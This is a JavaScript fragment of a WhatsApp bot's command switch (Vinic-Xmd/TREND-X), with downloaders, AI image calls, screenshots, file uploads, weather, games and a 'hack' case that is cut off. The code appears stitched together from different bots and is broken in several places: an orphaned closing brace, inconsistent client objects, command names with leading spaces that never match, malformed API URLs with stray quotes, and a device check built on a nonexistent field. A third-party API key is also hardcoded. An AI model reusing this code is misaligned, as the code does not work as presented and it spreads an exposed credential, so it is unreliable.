 async function dragonball({ m, args, reply,  mess, ephoto })  {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}dragonball Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.success}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in dragonball command:", error);
      reply("*An error occurred while generating the effect.*");
      }
    }
}
break
case "glossysilver": {
  const ephoto = async (url, text) => {
    try {
      const apiUrl = url.replace(/text=[^&]+/, `text=${encodeURIComponent(text)}`);
      const response = await fetch(apiUrl);
      
      if (!response.ok) {
        throw new Error(`API request failed with status ${response.status}`);
      }
      
      // First check if the response is an image
      const contentType = response.headers.get('content-type');
      if (contentType && contentType.includes('image')) {
        return apiUrl; // Return the direct image URL
      }
      
      // Otherwise try to parse as JSON
      const data = await response.json();
      
      // Check various possible response formats
      if (data.imageUrl) return data.imageUrl;
      if (data.url) return data.url;
      if (data.result) return data.result;
      if (typeof data === 'string' && data.startsWith('http')) return data;
      
      throw new Error('Unexpected API response format');
    } catch (error) {
      console.error('Ephoto error:', error);
      throw error;
    }
  };

  let q = args.join(" ");
  if (!q) {
    return reply(`*Example: ${prefix}glossysilver Kevin*`);
  }

  const link = "https://api.giftedtech.co.ke/api/ephoto360/glossysilver?apikey=gifted&text=Gifted+Tech";

  try {
    let result = await ephoto(link, q);
    // Ensure the result is a string URL before sending
    if (typeof result === 'object') {
      result = result.imageUrl || result.url || result.result;
    }
    await conn.sendMessage(
      m.chat,
      { image: { url: result.toString() }, caption: `${mess.success}` }, // Convert to string explicitly
      { quoted: m }
    );
  } catch (error) {
    console.error("Error in glossysilver command:", error);
    reply("*An error occurred while generating the effect. Please try again later.*");
  }
}
break
case " bardai": {
if (!text) return reply("*Please ask a question*");

    try {
      let response = await fetch(`https://restapi.apibotwa.biz.id/api/bard?message=${encodeURIComponent(text)}`);
      let data = await response.json();

      if (response.status !== 200 || !data.result || data.result.length === 0) {
        return reply("*Please try again later or try another command!*");
      } else {
        reply(data.result[0]); 
      }
    } catch (error) {
      console.error('Error fetching response from Bard API:', error);
      reply("An error occurred while fetching the response from Bard API.");
    }
}
break
case "flux": {
   try {
if (!text) return reply(`*Usage:* ${command} <prompt>\n\n*Example:* ${command} cat`);
    

    await reply('> *TREND-X ᴘʀᴏᴄᴇssɪɴɢ ɪᴍᴀɢᴇ...*');

    const apiUrl = `https://apis.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;

    await conn.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🎨 *FLUX IMAGE GENERATOR*\n\n📄 *PROMPT:* ${text}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Vinic-Xmd` }, { quoted: m });
  } catch (error) {
    console.error('Error in Flux command:', error);
    reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
      }
}
break
case "dalle": {
if (!text) return reply("*Please enter a query!*");

    const apiUrl = `https://api.siputzx.my.id/api/ai/stable-diffusion?prompt=${encodeURIComponent(text)}`;
    try {
      await conn.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m });
    } catch (error) {
      console.error('Error generating image:', error);
      reply("*An error occurred while generating the image.*");
    }
}
break
case " bible": {
try {
        // Vérifiez si une référence est fournie
        if (args.length === 0) {
            return reply(`⚠️ *Please provide a Bible reference.*\n\n📝 *Example:*\n.bible John 1:1`);
        }

        // Joindre les arguments pour former la référence
        const reference = args.join(" ");

        // Appeler l'API avec la référence
        const apiUrl = `https://bible-api.com/${encodeURIComponent(reference)}`;
        const response = await axios.get(apiUrl);

        // Vérifiez si la réponse contient des données
        if (response.status === 200 && response.data.text) {
            const { reference: ref, text, translation_name } = response.data;

            // Envoyez la réponse formatée avec des emojis
            reply(
                `📜 *Bible Verse Found!*\n\n` +
                `📖 *Reference:* ${ref}\n` +
                `📚 *Text:* ${text}\n\n` +
                `🗂️ *Translation:* ${translation_name}\n\n ©  Vinic-Xmd BIBLE`
            );
        } else {
            reply("❌ *Verse not found.* Please check the reference and try again.");
        }
    } catch (error) {
        console.error(error);
        reply("⚠️ *An error occurred while fetching the Bible verse.* Please try again.");
    }
}

break
case "play":
case "song": {
  if (!text) return reply(`Example: ${prefix + command} love you everyday by bebe cool`);
  try {
    // Search YouTube for the query
    const search = await yts(text);
    if (!search.videos.length) return reply("No results found for your query.");

    const video = search.videos[0];
    const metadata = {
      title: video.title,
      channel: video.author.name,
      duration: video.timestamp,
      views: video.views,
      thumbnail: video.thumbnail,
      url: video.url,
    };

    // Send metadata with thumbnail
    await conn.sendMessage(
      m.chat,
      {
        image: { url: metadata.thumbnail },
        caption: `
🎵 *Title*: ${metadata.title}
👤 *Channel*: ${metadata.channel}
⏱️ *Duration*: ${metadata.duration}
👀 *Views*: ${metadata.views}
        `,
      },
      { quoted: m }
    );

    // Use a reliable API for downloading audio
    const apiUrl = `https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(metadata.url)}`;
    const response = await fetch(apiUrl, { timeout: 10000 });
    if (!response.ok) throw new Error(`API error: ${response.statusText}`);

    const data = await response.json();
    if (!data.status || !data.result.downloadUrl) throw new Error("Failed to fetch audio download URL");

    // Send audio
    await conn.sendMessage(
      m.chat,
      {
        audio: { url: data.result.downloadUrl },
        mimetype: "audio/mpeg",
        fileName: `${metadata.title}.mp3`,
        ptt: command === "song",
        contextInfo: {
          externalAdReply: {
            title: metadata.title,
            body: `${metadata.channel} • ${metadata.duration}`,
            mediaType: 2,
            thumbnailUrl: metadata.thumbnail,
            renderLargerThumbnail: true,
            sourceUrl: metadata.url,
            showAdAttribution: true,
          },
        },
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(`Error in ${command} command:`, error);
    reply(`Error: ${error.message || "Unable to fetch audio. Try again later."}`);
  }
}
break;

case "play2": {
  if (!text) return reply(`Example: ${prefix + command} forever by ray g`);
  try {
    // Search YouTube for the query
    const search = await yts(text);
    if (!search.videos.length) return reply("No results found for your query.");

    const video = search.videos[0];
    const metadata = {
      title: video.title,
      channel: video.author.name,
      duration: video.timestamp,
      views: video.views,
      thumbnail: video.thumbnail,
      url: video.url,
    };

    // Send metadata with thumbnail
    await conn.sendMessage(
      m.chat,
      {
        image: { url: metadata.thumbnail },
        caption: `
🎵 *Title*: ${metadata.title}
👤 *Channel*: ${metadata.channel}
⏱️ *Duration*: ${metadata.duration}
👀 *Views*: ${metadata.views}
        `,
      },
      { quoted: m }
    );

    // Use an alternative API for downloading audio
    const apiUrl = `https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(metadata.url)}`;
    const response = await fetch(apiUrl, { timeout: 10000 });
    if (!response.ok) throw new Error(`API error: ${response.statusText}`);

    const data = await response.json();
    if (!data.status || !data.result.downloadUrl) throw new Error("Failed to fetch audio download URL");

    // Send audio
    await conn.sendMessage(
      m.chat,
      {
        audio: { url: data.result.downloadUrl },
        mimetype: "audio/mpeg",
        fileName: `${metadata.title}.mp3`,
        ptt: false,
        contextInfo: {
          externalAdReply: {
            title: metadata.title,
            body: `${metadata.channel} • ${metadata.duration}`,
            mediaType: 2,
            thumbnailUrl: metadata.thumbnail,
            renderLargerThumbnail: true,
            sourceUrl: metadata.url,
            showAdAttribution: true,
          },
        },
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(`Error in ${command} command:`, error);
    reply(`Error: ${error.message || "Unable to fetch audio. Try again later."}`);
  }
}
break;

case "ytmp4": {
  if (!text) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=example`);
  if (!isUrl(text) || !text.includes("youtube.com") && !text.includes("youtu.be")) {
    return reply("Please provide a valid YouTube URL.");
  }

  try {
    // Validate and fetch video metadata
    const search = await yts({ videoId: text.split("v=")[1]?.split("&")[0] || text.split("/")[3] });
    if (!search.videos.length) return reply("No video found for the provided URL.");

    const video = search.videos[0];
    const metadata = {
      title: video.title,
      channel: video.author.name,
      duration: video.timestamp,
      views: video.views,
      thumbnail: video.thumbnail,
      url: video.url,
    };

    // Send metadata with thumbnail
    await conn.sendMessage(
      m.chat,
      {
        image: { url: metadata.thumbnail },
        caption: `
🎥 *Title*: ${metadata.title}
👤 *Channel*: ${metadata.channel}
⏱️ *Duration*: ${metadata.duration}
👀 *Views*: ${metadata.views}
        `,
      },
      { quoted: m }
    );

    // Use API for downloading video
    const apiUrl = `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format='${encodeURIComponent(metadata.url)}&format=mp4`;
    const response = await fetch(apiUrl, { timeout: 10000 });
    if (!response.ok) throw new Error(`API error: ${response.statusText}`);

    const data = await response.json();
    if (!data.status || !data.result.downloadUrl) throw new Error("Failed to fetch video download URL");

    // Send video
    await conn.sendMessage(
      m.chat,
      {
        video: { url: data.result.downloadUrl },
        mimetype: "video/mp4",
        fileName: `${metadata.title}.mp4`,
        caption: global.wm,
        contextInfo: {
          externalAdReply: {
            title: metadata.title,
            body: `${metadata.channel} • ${metadata.duration}`,
            mediaType: 2,
            thumbnailUrl: metadata.thumbnail,
            renderLargerThumbnail: true,
            sourceUrl: metadata.url,
            showAdAttribution: true,
          },
        },
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(`Error in ${command} command:`, error);
    reply(`Error: ${error.message || "Unable to fetch video. Try again later."}`);
  }
}
break

case 'gitclone': {
if (!text) return reply("*Please provide gitHub repository link*")
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return reply("*Invalid link*")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await reply(`*Error! Repository Not Found*`)
}}
break
case 'mediafire': {
  if (!text) return reply("*Please provide mediafire link*")
  if (!text.includes("mediafire.com")) return reply("*Invalid link*");

  try {
    const res = await mediafire(text);
    if (!res.link) return reply("Error! Result Not Found");

    await GhostXz.sendMessage(
      m.chat,
      {
        document: { url: res.link },
        fileName: res.judul,
        mimetype: "application/" + res.mime.toLowerCase(),
      },
      { quoted: m }
    );
  } catch (e) {
    reply("Error! Result Not Found");
  }
}
break;

 case "tiktok": case "tikdl":  {
if (!text) {
    return reply('Please provide a TikTok video link.');
  }

  try {
    const response = await axios.get(`https://api.diioffc.web.id/api/search/tiktok?query=${encodeURIComponent(text)}`);

    if (response.data.status && response.data.BK9) {
      const videoUrl = response.data.BK9.BK9;
      const description = response.data.BK9.desc;
      const commentCount = response.data.BK9.comment_count;
      const likesCount = response.data.BK9.likes_count;
      const uid = response.data.BK9.uid;
      const nickname = response.data.BK9.nickname;
      const musicTitle = response.data.BK9.music_info.title;

      await client.sendMessage(m.chat, {
        text: `*Vinic-Xmd fetch data successfully ✅wait a moment.....*`,
      }, { quoted: m });

      await client.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: "*Downloaded by TREND-X 💪*",
        gifPlayback: false
      }, { quoted: m });

    } else {
      reply('Failed to retrieve video from the provided link.');
    }

  } catch (e) {
    reply(`An error occurred during download: ${e.message}`);
  }
}
  break       
case "facebook": {
  if (!text) return reply(`Example: ${prefix + command} https://www.facebook.com/watch/?v=123456789`);
  if (!isUrl(text) || !text.includes("facebook.com")) return reply("Please provide a valid Facebook video URL.");

  try {
    const apiUrl = `https://yt5s.io/api/ajaxSearch'${encodeURIComponent(text)}`;
    const response = await fetch(apiUrl, { timeout: 10000 });
    if (!response.ok) throw new Error(`API error: ${response.statusText}`);

    const data = await response.json();
    if (!data.status || !data.data.high) throw new Error("No video found for the provided URL");

    const metadata = {
      title: data.title || "Facebook Video",
      thumbnail: data.thumbnail || "https://files.catbox.moe/default_facebook_thumbnail.jpg",
    };

    // Send metadata with thumbnail
    await conn.sendMessage(
      m.chat,
      {
        image: { url: metadata.thumbnail },
        caption: `
📹 *Title*: ${metadata.title}
        `,
      },
      { quoted: m }
    );

    // Send video
    await conn.sendMessage(
      m.chat,
      {
        video: { url: data.data.high },
        mimetype: "video/mp4",
        fileName: `${metadata.title}.mp4`,
        caption: global.wm,
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(`Error in ${command} command:`, error);
    reply(`Error: ${error.message || "Unable to fetch Facebook video. Try again later."}`);
  }
}
break
case " tiktok2": {
try {
        if (!text) return reply("Please provide a TikTok video link.");
        if (!q.includes("tiktok.com")) return reply("Invalid TikTok link.");
        
        reply("Downloading video, please wait...");
        
        const apiUrl = `https://delirius-apiofc.vercel.app/download/tiktok?url=${q}`;
        const { data } = await axios.get(apiUrl);
        
        if (!data.status || !data.data) return reply("Failed to fetch TikTok video.");
        
        const { title, like, comment, share, author, meta } = data.data;
        const videoUrl = meta.media.find(v => v.type === "video").org;
        
        const caption = `🎵 *TikTok Video* 🎵\n\n` +
                        `👤 *User:* ${author.nickname} (@${author.username})\n` +
                        `📖 *Title:* ${title}\n` +
                        `👍 *Likes:* ${like}\n💬 *Comments:* ${comment}\n🔁 *Shares:* ${share}`;
        
        await conn.sendMessage(from, {
            video: { url: videoUrl },
            caption: caption,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: mek });
        
    } catch (e) {
        console.error("Error in TikTok downloader command:", e);
        reply(`An error occurred: ${e.message}`);
    }
}
break
case " apk": {
try {
    if (!q) {
      return reply("❌ Please provide an app name to search.");
    }

    await conn.sendMessage(from, { react: { text: "⏳", key: m.key } });

    const apiUrl = `http://ws75.aptoide.com/api/7/apps/search/query=${q}/limit=1`;
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (!data || !data.datalist || !data.datalist.list.length) {
      return reply("⚠️ No results found for the given app name.");
    }

    const app = data.datalist.list[0];
    const appSize = (app.size / 1048576).toFixed(2); // Convert bytes to MB

    const caption = `╭━━━〔 *APK Downloader* 〕━━━┈⊷
┃ 📦 *Name:* ${app.name}
┃ 🏋 *Size:* ${appSize} MB
┃ 📦 *Package:* ${app.package}
┃ 📅 *Updated On:* ${app.updated}
┃ 👨‍💻 *Developer:* ${app.developer.name}
╰━━━━━━━━━━━━━━━┈⊷
🔗 *Powered By Trend-x *`;

    await conn.sendMessage(from, { react: { text: "⬆️", key: m.key } });

    await conn.sendMessage(from, {
      document: { url: app.file.path_alt },
      fileName: `${app.name}.apk`,
      mimetype: "application/vnd.android.package-archive",
      caption: caption
    }, { quoted: m });

    await conn.sendMessage(from, { react: { text: "✅", key: m.key } });

  } catch (error) {
    console.error("Error:", error);
    reply("❌ An error occurred while fetching the APK. Please try again.");
  }
 }
break;
case "sswebtab": {
const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `https://api.tioo.eu.org/sstab?url=${q}`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred.");
    }
}
break
case "ssweb": {
 const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `${global.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=mobile`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred while generating the image.");
    }
}
break
case "url": {
    try {
        // Check if quoted message exists and has media
        const quotedMsg = message.quoted ? message.quoted : message;
        const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';
        
        if (!mimeType) {
            throw "Please reply to an image, video, or audio file";
        }

        // Download the media
        const mediaBuffer = await quotedMsg.download();
        const tempFilePath = path.join(os.tmpdir(), `catbox_upload_${Date.now()}`);
        fs.writeFileSync(tempFilePath, mediaBuffer);

        // Get file extension based on mime type
        let extension = '';
        if (mimeType.includes('image/jpeg')) extension = '.jpg';
        else if (mimeType.includes('image/png')) extension = '.png';
        else if (mimeType.includes('video')) extension = '.mp4';
        else if (mimeType.includes('audio')) extension = '.mp3';
        
        const fileName = `file${extension}`;

        // Prepare form data for Catbox
        const form = new FormData();
        form.append('fileToUpload', fs.createReadStream(tempFilePath), fileName);
        form.append('reqtype', 'fileupload');

        // Upload to Catbox
        const response = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: form.getHeaders()
        });

        if (!response.data) {
            throw "Error uploading to Catbox";
        }

        const mediaUrl = response.data;
        fs.unlinkSync(tempFilePath);

        // Determine media type for response
        let mediaType = 'File';
        if (mimeType.includes('image')) mediaType = 'Image';
        else if (mimeType.includes('video')) mediaType = 'Video';
        else if (mimeType.includes('audio')) mediaType = 'Audio';

        // Send response
        await reply(
            `*${mediaType} ᴜᴘʟᴏᴀᴅᴇᴅ sᴜᴄᴄᴇsғᴜʟʟʏ ✅*\n\n` +
            `*Size:* ${formatBytes(mediaBuffer.length)}\n` +
            `*URL:* ${mediaUrl}\n\n` +
            `> ᴜᴘʟᴏᴀᴅᴇᴅ ʙʏ trend-x ᴛᴇᴄʜ 🌟`
        );

    } catch (error) {
        console.error(error);
        await reply(`Error: ${error.message || error}`);
    }
 
}
break
case "fliptext": {
    if (args.length < 1) return reply(`*Example:\n${prefix}fliptext Kelvin*`);
    
    let quere = args.join(" ");
    let flipe = quere.split("").reverse().join("");
    
    reply(`Normal:\n${quere}\nFlip:\n${flipe}`);
}
break
case "getdevice": {
    if (!m.quoted) {
        return reply('*Please quote a message to use this command!*');
    }
    
    try {
        const quotedMsg = await m.getQuotedMessage();
        if (!quotedMsg) {
            return reply('*Could not detect, please try with newly sent message!*');
        }

        // Get the device information
        let device = "Unknown";
        if (quotedMsg.key.fromMe) {
            device = "Your own device";
        } else {
            // Check for the user agent or device info in the message
            const userAgent = quotedMsg?.userAgent || "";
            if (userAgent.includes("iPhone") || userAgent.includes("iOS")) {
                device = "iPhone (iOS)";
            } else if (userAgent.includes("Android")) {
                device = "Android";
            } else if (userAgent.includes("Web")) {
                device = "WhatsApp Web";
            } else if (userAgent.includes("Desktop")) {
                device = "WhatsApp Desktop";
            } else if (quotedMsg.key.remoteJid.endsWith('@s.whatsapp.net')) {
                device = "WhatsApp Official App";
            }
        }

        reply(`The message is sent from *${device}* device.`);
    } catch (err) {
        console.error('Error determining device:', err);
        reply('Error determining device: ' + err.message);
    }
}
break
case "toimage": {
const quoted = m.quoted || m.msg?.quoted;
    const mime = quoted?.mimetype || quoted?.msg?.mimetype;
    if (!quoted || !/webp/.test(mime)) {
      return reply(`*Send or reply to a sticker with the caption ${prefix + command}*`);
    }

    try {
      const media = await quoted.download();
      const inputPath = path.join(__dirname, getRandom('.webp'));
      fs.writeFileSync(inputPath, media);
      const outputPath = path.join(__dirname, getRandom('.png'));
      exec(`ffmpeg -i ${inputPath} ${outputPath}`, (err) => {
        fs.unlinkSync(inputPath); 

        if (err) {
          console.error('Error converting to image:', err);
          return reply('An error occurred while converting the sticker to an image.');
        }
        const buffer = fs.readFileSync(outputPath);
        conn.sendMessage(m.chat, { image: buffer }, { quoted: m });    
        fs.unlinkSync(outputPath);
      });
    } catch (error) {
      console.error('Error converting to image:', error);
      reply('An error occurred while converting the sticker to an image.');
    }
}
break
case "lyrics": {
 if (!text) return reply("Provide a song name.");
    
    try {
      const apiUrl = `https://xploader-api.vercel.app/lyrics?query=${encodeURIComponent(text)}`;
      const response = await fetch(apiUrl);
      const result = await response.json();

      if (!result.length || !result[0].song || !result[0].artist || !result[0].lyrics) throw new Error();

      conn.sendMessage(m.chat, {
        text: `🎵 *Lyrics for:* ${result[0].song} - ${result[0].artist}\n\n${result[0].lyrics}`
      }, { quoted: m });
    } catch (error) {
      console.error('❌ Unable to fetch lyrics:', error);
      reply("❌ Unable to fetch lyrics.");
    }
}
break
case "movie": {
try {
        const movieName = args.join(' ');
        if (!movieName) {
            return reply("📽️ Please provide the name of the movie.");
        }

        const apiUrl = `https://delirius-apiofc.vercel.app/search/movie?query=${encodeURIComponent(movieName)}`;
        const response = await axios.get(apiUrl);

        const data = response.data;
        if (!data.status || !data.data.length) {
            return reply("🚫 Movie not found.");
        }

        const movie = data.data[0]; // Pehla result le rahe hain
        const downloadLink = `https://delirius-apiofc.vercel.app/download/movie?id=${movie.id}`;

        const movieInfo = `
🎬 *Movie Information* 🎬

🎥 *Title:* ${movie.title}
🗓️ *Release Date:* ${movie.release_date}
🗳️ *Vote Average:* ${movie.vote_average}
👥 *Vote Count:* ${movie.vote_count}
🌍 *Original Language:* ${movie.original_language}
📝 *Overview:* ${movie.overview}
⬇️ *Download Link:* [Click Here](${downloadLink})
`;

        const imageUrl = movie.image || config.ALIVE_IMG;

        await conn.sendMessage(from, {
            image: { url: imageUrl },
            caption: `${movieInfo}\n> ©ᴘᴏᴡᴇʀᴇᴅ ʙʏ TREND-X 💪`
        }, { quoted: mek });
    } catch (e) {
        console.log(e);
        reply(`❌ Error: ${e.message}`);
    }
}
break
case "weather": {
if (!text) return reply("Provide a location.");

      try {
        const { data } = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`);
        
        const weatherInfo = `🌤️ *Weather for ${text}*\n\n`
          + `🌡️ *Temperature:* ${data.main.temp}°C (Feels like ${data.main.feels_like}°C)\n`
          + `🌪️ *Weather:* ${data.weather[0].main} - ${data.weather[0].description}\n`
          + `💨 *Wind Speed:* ${data.wind.speed} m/s\n`
          + `📍 *Coordinates:* ${data.coord.lat}, ${data.coord.lon}\n`
          + `🌍 *Country:* ${data.sys.country}`;

        conn.sendMessage(m.chat, { text: weatherInfo }, { quoted: m });
      } catch (error) {
        reply("❌ Unable to fetch weather data.");
      }
}
break
case "Shazam": {
const quoted = m.quoted ? m.quoted : null || m.msg ;
 const mime = quoted?.mimetype || ""; 
      if (!quoted || !/audio|video/.test(mime)) return reply("Reply to an audio or video to identify music.");
      
      try {
        const media = await m.quoted.download();
        const filePath = `./tmp/${m.sender}.${mime.split('/')[1]}`;
        fs.writeFileSync(filePath, media);

        const res = await acr.identify(fs.readFileSync(filePath));
        if (res.status.code !== 0) throw new Error(res.status.msg);

        const { title, artists, album, release_date } = res.metadata.music[0];
        const resultText = `🎵 *Music Identified!*\n\n*Title:* ${title}\n*Artist(s):* ${artists.map(v => v.name).join(', ')}\n`
          + `*Album:* ${album.name || 'Unknown'}\n*Release Date:* ${release_date || 'Unknown'}`;

        fs.unlinkSync(filePath);
        reply(resultText);
      } catch (error) {
        reply("❌ Unable to identify the music.");
      }
}
break
case 'chord':
case 'cr': {
  if(!text) return m.reply(`*query input*`);
  let anu = `https://api.diioffc.web.id/api/search/chord?query=${encodeURIComponent(text)}`;
  const res = await fetch(anu)
  const response = await res.json();
  m.reply(`Url: ${response.result.url}\nArtis: ${response.result.artist}\nArtisUrl: ${response.result.artistUrl}\nJudul: ${response.result.title}\nChord: ${response.result.chord}`), { quoted: m };
}
break
case "dare": {
const dares = [
      "Eat 2 tablespoons of rice without any side dishes.",
      "Spill a secret about yourself.",
      "Call your crush now and send a screenshot.",
      "Drop only emojis for 1 day in group chats.",
      "Sing the chorus of your favorite song.",
      "Change your name to 'I'm a daredevil' for 24 hours.",
      "Tell a random person 'I was told I'm your twin, separated at birth.'",
      "Pretend to be possessed by an animal for 30 minutes.",
      "Record yourself reading a funny quote and send it here.",
      "Prank chat an ex and say 'I still love you.'",
      "Change your profile picture to a funny meme for 5 hours.",
      "Type only in Spanish for 24 hours.",
      "Use a funny voice note greeting for 3 days.",
      "Drop a song quote and tag a suitable member.",
      "Say 'You're beautiful' to someone you admire.",
      "Act like a chicken in front of your parents.",
      "Read a page from a random book aloud and send it here.",
      "Howl like a wolf for 10 seconds outside.",
      "Make a short dance video and put it on your status.",
      "Eat a raw piece of garlic.",
      "Show the last five people you texted and what the messages said.",
      "Put your full name on status for 5 hours.",
      "Make a twerk dance video and put it on your status.",
      "Call your bestie and say 'I love you.'",
      "Put your photo without filters on your status.",
      "Say 'I love you' to someone you secretly admire.",
      "Send a voice note saying 'Can I call you baby?'",
      "Change your name to 'I'm a daredevil' for 24 hours.",
      "Use a Bollywood actor's photo as your profile picture.",
      "Put your crush's photo on status with the caption 'My crush.'",
      "Write 'I love you' to someone and send a screenshot.",
      "Slap your butt and send the sound effect.",
      "Shout 'Bravo!' and send it here.",
      "Snap your face and send it here.",
      "Send your photo with the caption 'I'm feeling confident.'",
      "Kiss your mom or dad and say 'I love you.'",
      "Put your dad's name on status for 5 hours.",
      "Make a TikTok dance challenge video.",
      "Break up with your best friend for 5 hours without telling them.",
      "Tell a friend you love them and want to marry them.",
    ];

    const dareMessage = dares[Math.floor(Math.random() * dares.length)];
    const buffer = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');

    await conn.sendMessage(
      from,
      {
        image: buffer,
        caption: `*DARE*\n${dareMessage}`,
      },
      { quoted: m }
    );
}
break
case "Quote": {
  try {
    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/fun/quotes?apikey=gifted`);
    const textquotes = `*QUOTES:* ${data.quote.body}\n\n*AUTHOR:* ${data.quote.author}`;
    return reply(textquotes);
  } catch (err) {
    console.error(err);
    return reply('*An error occurred while fetching the quote.*');
  }
}
break
case "truth": {
const truths = [
      "What's your biggest fear?",
      "Have you ever lied to your best friend?",
      "What's your deepest secret?",
      "Who's your secret crush?",
      "What's the biggest mistake you've ever made?",
      "Have you ever cheated on a test?",
      "What's the most embarrassing thing that's ever happened to you?",
      "Do you have a hidden talent?",
      "What's the biggest lie you've ever told?",
      "Have you ever been in love?",
      "What's the most spontaneous thing you've ever done?",
      "Who's the person you trust most?",
      "What's the biggest risk you've ever taken?",
      "Have you ever regretted something?",
      "What's the most memorable gift you've received?",
      "Have you ever had a crush on someone older?",
      "What's the biggest lesson you've learned?",
      "Have you ever broken someone's heart?",
      "What's the most exciting thing you've done?",
      "Do you believe in soulmates?",
      "What's the biggest challenge you've faced?",
      "Have you ever kept a secret from your parents?",
      "What's the most creative thing you've done?",
      "Have you ever felt betrayed?",
      "What's the biggest adventure you've been on?",
      "Have you ever had a rival?",
      "What's the most thoughtful thing someone's done for you?",
      "Have you ever forgiven someone?",
      "What's the biggest obstacle you've overcome?",
      "Do you believe in karma?",
      "What's the most romantic thing someone's done for you?",
      "Have you ever taken a risk for love?",
      "What's the biggest surprise you've ever received?",
      "Have you ever had a paranormal experience?",
      "What's the most inspiring story you've heard?",
      "Have you ever helped someone in need?",
      "What's the biggest accomplishment you're proud of?",
    ];

    const truthMessage = truths[Math.floor(Math.random() * truths.length)];
    const buffer = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');

    await conn.sendMessage(
      from,
      {
        image: buffer,
        caption: `*TRUTH*\n${truthMessage}`,
      },
      { quoted: m }
     );
        
}
break
case "compatibility": {
try {
    if (args.length < 2) {
      return reply("Please mention two users to calculate compatibility.\nUsage: `.compatibility @user1 @user2`");
    }

    let user1 = m.mentionedJid[0]; 
    let user2 = m.mentionedJid[1]; 

    const specialNumber = config.DEV ? `${config.DEV}@s.whatsapp.net` : null;

    // Calculate a random compatibility score (between 1 to 1000)
    let compatibilityScore = Math.floor(Math.random() * 1000) + 1;

    // Check if one of the mentioned users is the special number
    if (user1 === specialNumber || user2 === specialNumber) {
      compatibilityScore = 1000; // Special case for DEV number
      return reply(`💖 Compatibility between @${user1.split('@')[0]} and @${user2.split('@')[0]}: ${compatibilityScore}+/1000 💖`);
    }

    // Send the compatibility message
    await conn.sendMessage(mek.chat, {
      text: `💖 Compatibility between @${user1.split('@')[0]} and @${user2.split('@')[0]}: ${compatibilityScore}/1000 💖`,
      mentions: [user1, user2],
    }, { quoted: mek });

  } catch (error) {
    console.log(error);
    reply(`❌ Error: ${error.message}`);
  }
}
break
case "compliment": {
let compliments = [
        "You're amazing just the way you are! 💖",
        "You light up every room you walk into! 🌟",
        "Your smile is contagious! 😊",
        "You're a genius in your own way! 🧠",
        "You bring happiness to everyone around you! 🥰",
        "You're like a human sunshine! ☀️",
        "Your kindness makes the world a better place! ❤️",
        "You're unique and irreplaceable! ✨",
        "You're a great listener and a wonderful friend! 🤗",
        "Your positive vibes are truly inspiring! 💫",
        "You're stronger than you think! 💪",
        "Your creativity is beyond amazing! 🎨",
        "You make life more fun and interesting! 🎉",
        "Your energy is uplifting to everyone around you! 🔥",
        "You're a true leader, even if you don’t realize it! 🏆",
        "Your words have the power to make people smile! 😊",
        "You're so talented, and the world needs your skills! 🎭",
        "You're a walking masterpiece of awesomeness! 🎨",
        "You're proof that kindness still exists in the world! 💕",
        "You make even the hardest days feel a little brighter! ☀️"
    ];

    let randomCompliment = compliments[Math.floor(Math.random() * compliments.length)];
    let sender = `@${mek.sender.split("@")[0]}`;
    let mentionedUser = m.mentionedJid[0] || (mek.quoted && mek.quoted.sender);
    let target = mentionedUser ? `@${mentionedUser.split("@")[0]}` : "";

    let message = mentionedUser 
        ? `${sender} complimented ${target}:\n😊 *${randomCompliment}*`
        : `${sender}, you forgot to tag someone! But hey, here's a compliment for you:\n😊 *${randomCompliment}*`;

    await conn.sendMessage(mek.chat, { text: message, mentions: [mek.sender, mentionedUser].filter(Boolean) }, { quoted: mek });
}
break
case "jokes": {
 try {
      let res = await fetch("https://official-joke-api.appspot.com/random_joke");
      let json = await res.json();
      await conn.sendMessage(m.chat, { text: json.value }, { quoted: m });
    } catch (error) {
      console.error('Error fetching joke:', error);
      reply('An error occurred while fetching a joke.');
    }
}
break
case "hack": {
try {
        const steps = [
